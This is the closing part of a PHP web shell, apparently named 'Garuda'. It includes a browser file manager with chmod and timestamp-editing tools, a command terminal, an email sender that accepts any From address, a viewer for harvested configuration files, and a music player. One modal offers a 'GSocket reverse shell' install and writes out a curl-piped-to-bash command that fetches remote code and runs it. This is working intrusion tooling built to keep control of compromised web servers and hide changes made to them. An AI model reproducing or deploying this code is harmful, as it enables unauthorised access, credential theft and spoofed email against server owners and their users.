<button class="ab" onclick="event.stopPropagation();rf('<?=$jp?>')" title="Rename">📝</button>
<button class="ab" onclick="event.stopPropagation();df('<?=$jp?>')" title="Delete">🗑️</button>
</div>
<div class="fic" onclick="<?=$oc?>"><?=$ic?></div>
<div class="fn" onclick="<?=$oc?>"><?=$hf?></div>
<div class="fd"><div><?=$sz?> • <?=$pm?> <?=$pbd?></div>
<div class="fdt" onclick="event.stopPropagation();efd('<?=$jp?>','<?=$jd?>')">📅 <?=$dd?><span class="deb">✏️</span></div>
</div></div>
<?php }}?>
</div></div>

<div class="cd tm">
<div class="tmh"><div>💻 Terminal</div><div style="color:#666;font-size:.8rem"><?=htmlspecialchars(str_replace($BD,'~',$cd))?></div></div>
<div class="tmo" id="tmo">
<?php if(isset($_SESSION['th'])&&$_SESSION['th']):foreach($_SESSION['th']as$h):?>
<div style="margin-bottom:.5rem"><div style="color:#ff0">[<?=htmlspecialchars($h['t'])?>] <?=htmlspecialchars($h['p'])?> $ <?=htmlspecialchars($h['c'])?></div>
<?php if($h['o']):?><div><?=htmlspecialchars(implode("\n",$h['o']))?></div><?php endif;?></div>
<?php endforeach;else:?><div>🦅 Garuda Terminal Ready<br>Type 'help' for commands</div><?php endif;?>
</div>
<form method="POST" class="tmi"><div class="pm">$</div><input type="text" name="tc" placeholder="Type command..." autocomplete="off" id="tci"></form>
</div></div></div>

<!-- Modals -->
<div id="nfm" class="md"><div class="mdc"><h3>📄 New File</h3><form method="POST"><input type="hidden" name="act" value="cf"><div class="fgr"><label>Filename</label><input type="text" name="fn" required></div><div class="fgr"><label>Content</label><textarea name="ct"></textarea></div><div class="ma"><button type="button" class="btn bo" onclick="hm('nfm')">Cancel</button><button class="btn bs">Create</button></div></form></div></div>
<div id="nfom" class="md"><div class="mdc"><h3>📁 New Folder</h3><form method="POST"><input type="hidden" name="act" value="cfo"><div class="fgr"><label>Name</label><input type="text" name="fon" required></div><div class="ma"><button type="button" class="btn bo" onclick="hm('nfom')">Cancel</button><button class="btn bs">Create</button></div></form></div></div>
<div id="efm" class="md"><div class="mdc" style="max-width:700px"><h3>✏️ Edit File</h3><form method="POST"><input type="hidden" name="ef" value="1"><input type="hidden" name="fp" id="efp"><div class="fgr"><label>Content</label><textarea name="fc" id="efc" style="min-height:300px"></textarea></div><div class="ma"><button type="button" class="btn bo" onclick="hm('efm')">Cancel</button><button class="btn bs">💾 Save</button></div></form></div></div>
<div id="rnm" class="md"><div class="mdc"><h3>📝 Rename</h3><form method="POST"><input type="hidden" name="rn" value="1"><input type="hidden" name="op" id="rop"><div class="fgr"><label>New Name</label><input type="text" name="nn" id="rnn" required></div><div class="ma"><button type="button" class="btn bo" onclick="hm('rnm')">Cancel</button><button class="btn bs">Rename</button></div></form></div></div>
<div id="chm" class="md"><div class="mdc"><h3>🔧 Chmod</h3><form method="POST"><input type="hidden" name="ch" value="1"><input type="hidden" name="fp" id="chfp"><div class="fgr"><label>Current: <span id="chcp" style="font-family:monospace"></span></label></div><div class="fgr"><label>Mode</label><select name="md"><option value="0644">0644</option><option value="0755">0755</option><option value="0777">0777</option><option value="0444">0444</option><option value="0600">0600</option></select></div><div class="ma"><button type="button" class="btn bo" onclick="hm('chm')">Cancel</button><button class="btn bs">Apply</button></div></form></div></div>
<div id="edm" class="md"><div class="mdc"><h3>📅 Edit Date</h3><form method="POST"><input type="hidden" name="ed" value="1"><input type="hidden" name="fp" id="edfp"><div class="fgr"><label>Date</label><input type="datetime-local" name="nd" id="ednd" required></div><div class="ma"><button type="button" class="btn bo" onclick="hm('edm')">Cancel</button><button class="btn bs">Update</button></div></form></div></div>
<div id="em" class="md"><div class="mdc"><h3>📧 Email</h3><form method="POST"><input type="hidden" name="se" value="1"><div class="fgr"><label>To</label><input type="email" name="to" required></div><div class="fgr"><label>From</label><input type="email" name="fr" required></div><div class="fgr"><label>Subject</label><input type="text" name="sb" required></div><div class="fgr"><label>Message</label><textarea name="ms" required></textarea></div><div class="ma"><button type="button" class="btn bo" onclick="hm('em')">Cancel</button><button class="btn bs">Send</button></div></form></div></div>
<div id="gsm" class="md"><div class="mdc"><h3>🔗 GSocket</h3><p style="margin-bottom:1rem;color:var(--t2)">Install GSocket reverse shell</p><div style="background:#000;padding:1rem;border-radius:8px;margin-bottom:1rem"><code style="color:#0f0">bash -c "$(curl -fsSL https://gsocket.io/y)"</code></div><form method="POST"><input type="hidden" name="gs" value="1"><div class="ma"><button type="button" class="btn bo" onclick="hm('gsm')">Cancel</button><button class="btn bs">🚀 Install</button></div></form></div></div>
<div id="sm" class="md"><div class="mdc"><h3>🔐 Security</h3>
<?php if(!ips()):?><div style="background:rgba(245,158,11,.1);border:1px solid var(--wa);padding:1rem;border-radius:8px;margin-bottom:1rem"><strong style="color:var(--wa)">⚠️ Not Protected</strong></div>
<form method="POST"><input type="hidden" name="setp" value="1"><div class="fgr"><label>Password</label><input type="password" name="pw" required onkeyup="cs(this.value)"><div class="ps"><div class="psb" id="psb"></div></div></div><div class="fgr"><label>Confirm</label><input type="password" name="cpw" required></div><div class="ma"><button type="button" class="btn bo" onclick="hm('sm')">Cancel</button><button class="btn bs">Enable</button></div></form>
<?php else:?><div style="background:rgba(16,185,129,.1);border:1px solid var(--ok);padding:1rem;border-radius:8px;margin-bottom:1rem"><strong style="color:var(--ok)">✅ Protected</strong></div>
<form method="POST"><input type="hidden" name="chgp" value="1"><div class="fgr"><label>Current Password</label><input type="password" name="op" required></div><div class="fgr"><label>New Password</label><input type="password" name="np" required onkeyup="cs(this.value)"><div class="ps"><div class="psb" id="psb"></div></div></div><div class="fgr"><label>Confirm</label><input type="password" name="cpw" required></div><div class="ma"><button type="button" class="btn bo" onclick="hm('sm')">Cancel</button><button class="btn bs">Change</button></div></form>
<div class="dz"><h4>🗑️ Remove</h4><form method="POST" onsubmit="return confirm('Remove password?')"><input type="hidden" name="rmp" value="1"><button class="btn bd" style="width:100%">Remove Password</button></form></div><?php endif;?>
</div></div>

<?php if(isset($_SESSION['cfs'])&&$_SESSION['cfs']):?><div id="cfm" class="md" style="display:block"><div class="mdc" style="max-width:800px"><h3>⚙️ Configs</h3>
<?php foreach($_SESSION['cfs']as$d=>$c):?><div style="margin-bottom:1rem"><h4 style="color:var(--ac)"><?=htmlspecialchars($d)?></h4><small style="color:var(--t2)"><?=htmlspecialchars($c['p'])?></small><pre style="background:#000;color:#0f0;padding:1rem;border-radius:8px;max-height:200px;overflow:auto;margin-top:.5rem"><?=$c['c']?></pre></div><?php endforeach;?>
<div class="ma"><button class="btn" onclick="hm('cfm')">Close</button></div></div></div><?php unset($_SESSION['cfs']);endif;?>

<script>
function sm(i){document.getElementById(i).style.display='block'}
function hm(i){document.getElementById(i).style.display='none'}
function nv(p){location.href='?d='+encodeURIComponent(decodeURIComponent(p))}
function ef(p){
    fetch('?gf='+p)
    .then(r=>{
        if(!r.ok) throw new Error('Cannot read file');
        return r.text();
    })
    .then(c=>{
        document.getElementById('efp').value=decodeURIComponent(p);
        document.getElementById('efc').value=c;
        sm('efm');
    })
    .catch(e=>{
        alert('Error: '+e.message);
        console.error('Edit file error:', e);
    });
}
function rf(p){document.getElementById('rop').value=decodeURIComponent(p);document.getElementById('rnn').value=decodeURIComponent(p).split('/').pop();sm('rnm')}
function df(p){if(confirm('Delete '+decodeURIComponent(p).split('/').pop()+'?')){let f=document.createElement('form');f.method='POST';f.innerHTML='<input name="act" value="del"><input name="f" value="'+decodeURIComponent(p)+'">';document.body.appendChild(f);f.submit()}}
function scm(p,pm){document.getElementById('chfp').value=decodeURIComponent(p);document.getElementById('chcp').textContent=pm;sm('chm')}
function efd(p,d){document.getElementById('edfp').value=decodeURIComponent(p);let dt=new Date(d);if(!isNaN(dt))document.getElementById('ednd').value=dt.toISOString().slice(0,16);sm('edm')}
function ec(c){document.getElementById('tci').value=c;document.getElementById('tci').form.submit()}
function tt(){let f=document.createElement('form');f.method='POST';f.innerHTML='<input name="tt" value="1"><input name="th" value="<?=$TH?>">';document.body.appendChild(f);f.submit()}
function cs(p){let b=document.getElementById('psb');if(!b)return;let s=0;if(p.length>=6)s++;if(p.length>=10)s++;if(/[a-z]/.test(p)&&/[A-Z]/.test(p))s++;if(/\d/.test(p))s++;if(/[^a-zA-Z\d]/.test(p))s++;let c=['#ef4444','#f59e0b','#eab308','#84cc16','#10b981'],w=['20%','40%','60%','80%','100%'];b.style.width=w[Math.min(s,4)];b.style.background=c[Math.min(s,4)]}

// Music Player dengan Persistent State
const ap=document.getElementById('ap'),vn=document.getElementById('vn'),plb=document.getElementById('plb'),pvb=document.getElementById('pvb'),nxb=document.getElementById('nxb'),bwb=document.getElementById('bwb'),fwb=document.getElementById('fwb'),prb=document.getElementById('prb'),prf=document.getElementById('prf'),cti=document.getElementById('cti'),dri=document.getElementById('dri'),stt=document.getElementById('stt'),sta=document.getElementById('sta'),pls=document.querySelectorAll('.pli');
let ci=-1,ip=false;

// Fungsi untuk menyimpan state music player
function saveMusicState() {
    const state = {
        currentIndex: ci,
        isPlaying: ip,
        currentTime: ap.currentTime || 0,
        currentSrc: ap.src || '',
        volume: ap.volume || 1
    };
    localStorage.setItem('garudaMusicState', JSON.stringify(state));
}

// Fungsi untuk memuat state music player
function loadMusicState() {
    const saved = localStorage.getItem('garudaMusicState');
    if (saved) {
        const state = JSON.parse(saved);
        
        // Cari lagu yang sama berdasarkan URL
        if (state.currentSrc) {
            for (let i = 0; i < pls.length; i++) {
                if (pls[i].dataset.u === state.currentSrc) {
                    ci = i;
                    lt(i);
                    
                    // Set waktu dan volume
                    ap.currentTime = state.currentTime || 0;
                    ap.volume = state.volume || 1;
                    
                    // Jika sebelumnya sedang play, lanjutkan play
                    if (state.isPlaying) {
                        setTimeout(() => {
                            ap.play().catch(e => console.log('Auto-play prevented'));
                        }, 500);
                    }
                    break;
                }
            }
        }
    }
}

function ft(s){if(isNaN(s))return'0:00';let m=Math.floor(s/60),sc=Math.floor(s%60);return m+':'+(sc<10?'0':'')+sc}

function lt(i){
    if(i<0||i>=pls.length)return;
    ci=i;
    let t=pls[i];
    ap.src=t.dataset.u;
    stt.textContent=t.dataset.t;
    sta.textContent=t.dataset.a;
    pls.forEach(p=>p.classList.remove('act'));
    t.classList.add('act');
    t.scrollIntoView({behavior:'smooth',block:'nearest'});
    
    // Simpan state setiap kali ganti lagu
    saveMusicState();
}

function pl(){
    if(ci<0&&pls.length)lt(0);
    if(ap.paused){
        ap.play().then(()=>{
            ip=true;
            plb.textContent='⏸️';
            vn.classList.add('sp');
            saveMusicState();
        }).catch(e=>{
            console.log('Play failed:', e);
        });
    }else{
        ap.pause();
        ip=false;
        plb.textContent='▶️';
        vn.classList.remove('sp');
        saveMusicState();
    }
}

// Event listeners untuk music player
if(plb)plb.onclick=pl;

if(pvb)pvb.onclick=()=>{
    if(ci>0){
        lt(ci-1);
        if(ip)ap.play();
    }
};

if(nxb)nxb.onclick=()=>{
    if(ci<pls.length-1){
        lt(ci+1);
        if(ip)ap.play();
    }
};

if(bwb)bwb.onclick=()=>{
    if(ap){
        ap.currentTime=Math.max(0,ap.currentTime-10);
        saveMusicState();
    }
};

if(fwb)fwb.onclick=()=>{
    if(ap){
        ap.currentTime=Math.min(ap.duration||0,ap.currentTime+10);
        saveMusicState();
    }
};

if(ap){
    ap.ontimeupdate=()=>{
        if(ap.duration){
            prf.style.width=(ap.currentTime/ap.duration*100)+'%';
            cti.textContent=ft(ap.currentTime);
            dri.textContent=ft(ap.duration);
        }
        // Simpan progress secara periodic
        if (ap.currentTime % 5 < 0.1) { // Setiap ~5 detik
            saveMusicState();
        }
    };
    
    ap.onended=()=>{
        if(ci<pls.length-1){
            lt(ci+1);
            ap.play();
        }else{
            ip=false;
            plb.textContent='▶️';
            vn.classList.remove('sp');
            saveMusicState();
        }
    };
    
    ap.onvolumechange=()=>{
        saveMusicState();
    };
}

if(prb)prb.onclick=e=>{
    let r=prb.getBoundingClientRect(),p=(e.clientX-r.left)/r.width;
    if(ap&&ap.duration){
        ap.currentTime=p*ap.duration;
        saveMusicState();
    }
};

pls.forEach((p,i)=>p.onclick=()=>{
    lt(i);
    pl();
});

// Muat state music player saat halaman dimuat
document.addEventListener('DOMContentLoaded', function() {
    loadMusicState();
});

// Simpan state sebelum halaman ditutup/refresh
window.addEventListener('beforeunload', function() {
    saveMusicState();
});

// Juga simpan state secara periodic (setiap 10 detik) untuk backup
setInterval(saveMusicState, 10000);

setTimeout(()=>{let n=document.getElementById('nt');if(n)n.style.display='none'},5000);
let tm=document.getElementById('tmo');if(tm)tm.scrollTop=tm.scrollHeight;
document.querySelectorAll('.md').forEach(m=>m.onclick=e=>{if(e.target===m)hm(m.id)});
document.getElementById('tci')?.focus();
</script>
</body></html>
